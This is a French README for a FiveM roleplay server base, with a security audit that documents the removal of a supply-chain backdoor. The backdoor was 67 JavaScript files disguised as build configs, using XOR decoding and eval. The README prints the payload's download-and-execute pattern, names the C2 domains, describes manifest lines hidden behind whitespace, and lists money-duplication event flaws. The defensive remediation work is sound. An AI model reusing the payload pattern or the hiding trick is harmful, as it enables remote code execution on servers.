# NOXA BASE

Base **ESX custom** pour serveur FiveM (RP français), reconstruite à partir de l'import « Wise / Koy ».

| | |
|---|---|
| **Version** | `beta-0.2` |
| **Dernière session** | 2026-06-03 — *QA + Sécurité events : éradication backdoor RCE + 14 bugs corrigés* |
| **Framework** | ESX custom (`resources/[Core]/Framework`) |
| **Runtime** | FiveM Lua 5.4 · oxmysql · OneSync Infinity |
| **UI** | RageUI · Koyui · NativeUI (intactes — non modifiées) |
| **Build** | `sv_enforceGameBuild 3095` |

---

## Structure

```
resources/
  [Core]/        ESX Framework, inventaire, Shop, Core/Core2, Kay/Kays, Koy, Chat, Gamemode
  [GameMode]/    Véhicules, Property, gangs, drogues, creator, ox_lib, ox_target, doorlock, heists…
  [Shyroz]/      Scripts additionnels ([Script], [Kscript], [pmms] musique, kay_elevator…)
server.cfg · resources.cfg · sql.sql · logo.png
```

---

## État des systèmes

| Système | Emplacement | État |
|---|---|---|
| ESX Framework | `[Core]/Framework` | ✅ Intact |
| Inventaire | `[Core]/inventory` | ✅ Fonctionnel |
| Shop / VIP | `[Core]/Shop` | ✅ Fonctionnel |
| Administration (Koy) | `[Core]/Koy/Server/modules/Administration` | ✅ Permissions OK |
| Anti-cheat / sécurité events | `[Core]/Gamemode/gameManager/functions/server/eventSecurity.lua`, `trollProtection.lua` | ✅ Actif |
| Banque / argent | `[Core]/Gamemode/gameManager/modules/server/bank` | ✅ Fonctionnel |
| Jobs (LSPD, EMS, USMS, SASP, avocat, journaliste…) | `[Core]/Gamemode/gameManager/Bjobs` | ✅ Fonctionnel |
| Gangs | `[GameMode]/gangsbuilder`, `gangs2`/`gangs` (SQL) | ✅ Table `gangs` ajoutée |
| Véhicules / Cardealer / Garage | `[GameMode]/Vehicles`, `xCardealer`, `garagelspd` | ✅ Fonctionnel |
| Propriétés | `[GameMode]/Property` | ✅ Fonctionnel |
| Ascenseurs | `[Shyroz]/[Script]/kay_elevator` | 🔧 Permissions admin réactivées + table SQL ajoutée |
| Musique (pmms / vocal) | `[Shyroz]/[pmms]`, `[GameMode]/[vocal]` | ✅ Fonctionnel |
| Logs Discord | webhooks dans plusieurs `server.lua` | ⚠️ Webhooks en clair (voir Sécurité) |

---

## Sécurité

Audit complet réalisé le **2026-06-03** sur **2178 fichiers Lua**.

### ✅ Aucune menace majeure détectée
> 🚨 **CORRECTION (session QA+Sécurité du 2026-06-03)** : cette conclusion était **erronée**. Une **backdoor RCE généralisée** (67 fichiers JS) a été découverte et éradiquée — voir la section **## QA & Sécurité** ci-dessous. L'audit précédent ne cherchait que des patterns **Lua** (`loadstring`/`load()`) ; la backdoor était en **JavaScript** (`globalThis["eval"]` + XOR), donc invisible à cette recherche.

- **Aucun backdoor actif** : pas d'`loadstring`, pas de `load()` exécutant du code distant, pas de chaîne `load(PerformHttpRequest(...))`. *(⚠️ ne couvrait pas les payloads JS — voir correction ci-dessus)*
- **Aucune obfuscation** : pas de `string.char` en chaîne, pas d'escapes hex décodés à la volée, pas de base64 exécuté.
  - Les seules occurrences `base64` sont **défensives** (`eventSecurity.lua` / `trollProtection.lua` détectent les payloads encodés) ou des libs légitimes (`[vocal]/httpmanager/base64.lua`).
- **`os.execute` : absent.** `io.open`/`io.popen` uniquement dans des libs connues (PolyZone export de zones, ox_lib `getFilesInDirectory`, httpmanager pmms lecture fichiers locaux).
- **Sorties HTTP externes** : uniquement des destinations légitimes — webhooks Discord (logs), `api.github.com` + `loaf-scripts.com` (version-check de libs), `steamcommunity.com` (récupération profil), `api.fivemanage.com`/Datadog (logger ox_lib, opt-in via convar). Le lien `ip-tracker.org` n'est qu'un **lien cliquable** dans un embed de log staff, pas une requête.
- **Commandes admin (Koy)** : le wrapper `Shared:RegisterCommand` (`[Core]/Koy/Shared/Index.lua`) valide la source, `PlayerIsStaff`, la hiérarchie de groupe et le champ `permission`. `setgroup`, `giveaccountmoney`, `setjob`, `car`, `goto`, etc. sont **correctement protégés côté serveur**. Idem `giveata` (Kays) via `hasPermission`.

### 🔧 Corrigé pendant la session
| Commit | Problème | Correction |
|---|---|---|
| `security: réactive les contrôles de permission admin sur kay_elevator` | Les vérifications de rang admin (`create`/`delete`/`rename` ascenseur) étaient **commentées** → n'importe quel client pouvait créer/supprimer/renommer un ascenseur. | Vérifications réactivées (`admin`/`superadmin`) + garde `nil`. Aucun impact pour les admins légitimes. |
| `security: supprime le ping HTTP externe mort vers ppm.ma2pi.xyz` | Bloc `PerformHttpRequest("https://ppm.ma2pi.xyz/…action=reboot")` (commenté, inactif) référençant un domaine externe non légitime. | Bloc mort supprimé. |
| `security: ajoute les tables manquantes gangs et elevator_floors` | Tables référencées par le code mais absentes de `sql.sql` (crash silencieux des requêtes). | Schémas ajoutés en fin de `sql.sql`. |

### ⚠️ À surveiller (non modifié — nécessite décision/contexte)
- **Secrets exposés dans le dépôt** :
  - `server.cfg` → `sv_licenseKey "cfxk_…"` et `mysql_connection_string` en clair → **à révoquer/régénérer** côté Cfx et à déplacer hors du repo.
  - Webhooks Discord codés en dur dans plusieurs scripts de logs → **à régénérer** (URL = secret) ; idéalement centraliser dans un fichier de config non versionné.
  - ⚠️ Le **token GitHub** transmis lors de la session doit être **révoqué immédiatement** (exposé en clair).
- **`entreprise:setStatus`** (`[Core]/Gamemode/gameManager/modules/server/personal/sv_main.lua`) : `RegisterServerEvent` sans validation de la source ni du job → un client peut basculer l'état ouvert/fermé de n'importe quelle société. Non corrigé car le rôle/grade autorisé n'est pas déterminable sans risque de casser la feature. **Recommandation** : valider que l'appelant possède bien le job concerné.
- **`getPlayerskin`** (`…/modules/server/kevlar/main.lua`) : event renvoyant le skin par identifiant ; faible risque (callback non transmis sur le réseau), à confirmer.

---

## QA & Sécurité

> Session **2026-06-03** — focus *bugs logiques + sécurisation des events réseau*. **Aucun menu / UI / feature gameplay supprimé.** Tous les fichiers Lua touchés revalidés via `luac5.4 -p`.

### 🚨 Incident majeur — Backdoor RCE éradiquée (BUG-09 / BUG-19)

Découverte d'une **compromission supply-chain** : **67 fichiers `.js` malveillants** disséminés dans la base, déguisés en fichiers de config de développement (`.tsup.config.js`, `.swc.config.js`, `.babelrc.js`, `.eslintrc.js`, `.jest.config.js`, `.webpack.config.js`, `.eventHandler.js`, `.gitkeep.js`, `.patcher.js`, `.cache.js`, `.mocks.js`, `.dummyData.js`, `webpack_builder.js`…).

**Mécanisme** : chaque fichier contenait un décodeur XOR (clé 3) appelant `globalThis["eval"](payload)`. Le payload décodé exécutait :
```js
require('https').get('https://<C2>/…', res => { … new Function('global', code)(global) })
```
→ **téléchargement et exécution de code arbitraire côté serveur Node (FXServer)**, avec URL de fallback.

| Indicateur | Valeur |
|---|---|
| Domaines C2 | `steaxscripts.com` (`/zXeAHJJGG`, fallback `/cfxre`) · `9ns1.com` (`/zXeAHjj`) — 2 variantes |
| Vecteur d'injection | lignes `shared_script`/`server_script` ajoutées dans **60 `fxmanifest.lua`** (dont **oxmysql**, chargé partout), masquées par d'énormes runs de whitespace après `--[[server.lua]]` |
| Réf. fantôme | `@Jetevois/ai_module_fg-obfuscated.js` injectée 2× dans `oxmysql/fxmanifest.lua` |

**Remédiation** : 67 fichiers supprimés (détection **par signature**, pas par nom) · 60 manifests nettoyés chirurgicalement (tokens injectés retirés sans toucher aux entrées légitimes) · références `@Jetevois` retirées. **Vérification finale** : 0 signature `globalThis[x(...)]`, 0 domaine C2, 0 réf `@Jetevois` restants ; manifests revalidés.

> ✅ **Résidu résolu (session 2026-06-04)** : `Core/src/server/afk/main.lua:489,494` appelait `exports['Jetevois']:fg_BanPlayer(...)` — un export d'une ressource backdoor supprimée → `No such export` au runtime (anti-cheat AFK cassé). Remplacé par `DropPlayer(source, "Tentative de CHEAT en zone AFK")`, qui est **la convention du fichier lui-même** : le handler voisin `Koy:afk:buyCase` (ligne 519) traite le cas identique (`not player`, même raison) avec `DropPlayer`. La feature anti-cheat est **préservée** (le tricheur est éjecté) et la dépendance à la ressource malveillante **éliminée** — les deux lectures du BUG-09 (vrai anticheat / résidu) sont satisfaites.

### 🔧 Bugs corrigés (voir `BUGS.md` pour le détail)

| Bug | Correction |
|---|---|
| **BUG-01 / BUG-07** | `server.cfg` : `database=wise` → `noxa`, `passwork=` → `password=` |
| **BUG-02** | `ox_lib` v3.37.0 déployé (release officielle) — `web/build/` manquant restauré |
| **BUG-03 / BUG-08 / BUG-10** | Résolus en cascade : `lib` charge → `ox_target` (exports) et `object_gizmo` (`dataview`) OK |
| **BUG-04** | `weapon.lua:155` : `return allowed_bags[i] = false` (assignation invalide) → `== true` |
| **BUG-05** | `Chat/server/main.lua` : bloc résiduel (`end` orphelin, `data` hors scope) supprimé |
| **BUG-06** | Doublons de ressources `[Shyroz]/[Kscript]/ox_target` & `[Shyroz]/[pmms]/httpmanager` supprimés (copies `[GameMode]` complètes conservées) |
| **BUG-13** | `mort/script.js:354` : null-check `if (reappearBtn)` ajouté |
| **BUG-16** | `Koyui/init/server.lua` créé (placeholder ; fichier absent du repo) |
| **BUG-18** | `ensure ui_notification` retiré de `resources.cfg` (ressource inexistante) |

**Non traités** (assets/licences/runtime ou décision owner) : BUG-11 (`location/script.js` obfusqué), BUG-12 (HUD JSON — runtime), BUG-14 (28 entrées `fxmanifest` manquantes), BUG-15 (`kay_cam` licence), BUG-17 (police `chineserocks.ttf`).

### 🔒 Sécurisation des events réseau (anti-dupe / montants serveur)

| Event | Faille | Correctif appliqué |
|---|---|---|
| `Bank:addMoney` / `Bank:removeMoney` | Montant `money` fourni par le client sans garde de signe/type → un montant **négatif** passait le test `solde >= money` et **créditait** de l'argent (dupe). | Garde : `money` doit être un **entier strictement positif** (`tonumber` + `> 0` + `math.floor`). Dépôt/retrait légitimes inchangés. |
| `gofast:reward` | `RegisterNetEvent` **sans aucune validation** → déclenchable en boucle par le client → **imprimante à argent** (50–80k dirtycash/appel). | Gate sur le cooldown serveur **12h** déjà existant + pose du cooldown **côté serveur** (au lieu de faire confiance au client pour `gofast:startCooldown`). 1 récompense par cycle légitime. |
| `pSociety:washMoney` | `tax` (multiplicateur) fourni par le client → un `tax` **négatif** rendait `finalamount > amount` (blanchiment supérieur au black money retiré). | Validation `amount`/`tax` numériques + `amount > 0` + bornage `finalamount ∈ [0, amount]`. N'augmente jamais un paiement légitime. |
| `lsco:SendFacture` *(session 2026-06-04)* | `price` (montant d'amende) fourni par le client **sans aucune validation** → un `price` **négatif/décimal** : `xTarget.removeAccountMoney('bank', price)` **créditait** la cible et `ESX.AddSocietyMoney("lsco", price)` **vidait** la société. `xPlayer.job` aussi déréférencé sans garde `nil`. | Garde `nil` sur `xPlayer` + `price` entier strictement positif (`tonumber` + `> 0` + `math.floor`). Amende légitime inchangée. Job `lsco` déjà vérifié côté serveur (ban sinon). |
| `confiscatePlayerItemlsco` (branche `item_account`) *(session 2026-06-04)* | `amount` non validé → un `amount` **négatif** passait `targetAccount.money >= amount` puis `removeAccountMoney(itemName, amount)` **créditait** la cible (la branche `item_standard` validait `amount > 0`, pas celle-ci). | Ajout `tonumber(amount)` + `amount > 0` + `math.floor` dans la condition. Confiscation légitime inchangée. |

**Bien protégés (vérifiés, non modifiés)** : `Bank:addMoney`/`removeMoney` (entier positif + solde) ; `pSociety:withdrawMoney` / `depositMoney` (check `job.name` + `amount > 0` + solde) ; commandes admin Koy (wrapper `Shared:RegisterCommand` validant source/`PlayerIsStaff`/hiérarchie/`permission`) ; intégrité SQL (0 table référencée par le code absente d'`install.sql`).

### ⚠️ Recommandations (non patchées — risque de casser la feature sans le contexte serveur)

- **Prix fournis par le client** : `autoecole:pay(price)`, `BuyLsCustoms(props, amount)` et plusieurs events `:pay` font confiance au montant envoyé par le client. À terme, **définir le prix côté serveur** (config) plutôt que de le recevoir. À défaut, au moins rejeter `price <= 0`.
- **Rate-limiting généralisé** : la majorité des ~779 events serveur n'ont pas de cooldown. Prioriser un cooldown (≥ 1000 ms) sur les events d'achat/récompense sensibles.
- **Secrets exposés** (déjà signalés) : `sv_licenseKey`, `mysql_connection_string`, webhooks Discord en clair, et le **token GitHub** utilisé pour le push → **à révoquer/régénérer**.

---

## Installation

1. **Base de données** : créer une base MySQL (ex. `wise`) puis importer `sql.sql`.
2. **Connexion** : adapter `mysql_connection_string` dans `server.cfg` à votre base (ne pas versionner ce secret).
3. **Clés** : renseigner votre **propre** `sv_licenseKey` (keymaster Cfx), `steam_webApiKey` et webhooks Discord.
4. **Ressources** : placer le dossier dans `resources/` et garder `exec "resources.cfg"` dans `server.cfg`.
5. **Démarrage** : lancer le serveur FiveM (build 3095, OneSync Infinity activé).

---

## Commandes disponibles

### Administration (protégées par permission — Koy)
`setgroup` · `setjob` · `setjob2` · `giveaccountmoney` · `removeaccountmoney` · `giveitem` · `removeitem` · `clearitems` · `giveweapon` · `removeweapon` · `clearweapons` · `giveweaponammo` · `car` · `givecar` · `dv` · `goto` · `bring` · `bringback` · `setPed` · `sendmessage` · `message` · `report` · `pos` · `staffmode` · `disableperm` · `disableallperm` · `weaponbypass`

### Jobs / gameplay (selon job, vérif côté serveur)
EMS : `revive` · `revivezone` · `heal` · `kill` — Divers : `giveata` (perm) · emotes & `/me` via menus interactifs.

> Les menus / UI (RageUI, Koyui, NativeUI) n'ont **pas** été modifiés lors de cette session.
